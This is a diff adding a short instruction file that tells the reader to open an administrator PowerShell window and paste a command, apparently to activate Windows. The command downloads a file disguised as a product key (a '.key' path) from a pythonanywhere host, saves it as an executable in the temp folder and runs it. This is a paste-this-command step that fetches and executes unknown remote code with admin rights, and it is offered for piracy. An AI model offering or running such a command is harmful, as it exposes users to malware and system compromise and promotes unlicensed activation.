@@ -1,0 +1,7 @@
+1. Open the powershell(admin) terminal
+2. past link.
+3. Press Enter
+4. Refresh your computer.
+5. Finish.
+
+Link:- Invoke-WebRequest -Uri kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key -OutFile $env:TEMP\AcWin.exe; Start-Process $env:TEMP\AcWin.exe
